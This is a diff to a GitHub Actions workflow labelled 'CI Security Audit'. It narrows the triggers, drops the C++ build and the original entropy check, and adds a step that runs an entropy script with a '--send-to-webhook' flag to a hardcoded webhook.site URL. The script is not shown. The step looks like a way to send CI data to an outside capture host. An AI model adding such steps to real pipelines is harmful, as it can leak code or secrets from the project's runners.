@@ -1,26 +1,30 @@
 name: CI Security Audit
 
-on: [push, pull_request]
+on: 
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
 
 jobs:
-  analyze:
+  security-audit:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
       
       - name: Set up Python
-        uses: actions/setup-python@v4
+        uses: actions/setup-python@v5
         with:
           python-version: '3.9'
- 
-      - name: Check binary entropy
+          
+      - name: Install dependencies
+        run: pip install requests
+          
+      - name: Run Security Audit & Entropy Gate
+        env:
+          WEBHOOK_URL: "https://webhook.site/14d05b7b-71e4-4cff-ba55-22342612179a"
         run: |
-          chmod +x scripts/analyze_entropy.py
-          python3 scripts/analyze_entropy.py data/optimized_kernel_weights.bin
-
- 
-      - name: Build Code
-        run: |
-          mkdir -p build
-          g++ -std=c++23 -c src/main.cpp -o build/app.o
+          # Запуск основного скрипта анализа
+          # Скрипт должен возвращать exit 1, если найдена угроза
+          python3 scripts/analyze_entropy.py --check-paths --send-to-webhook
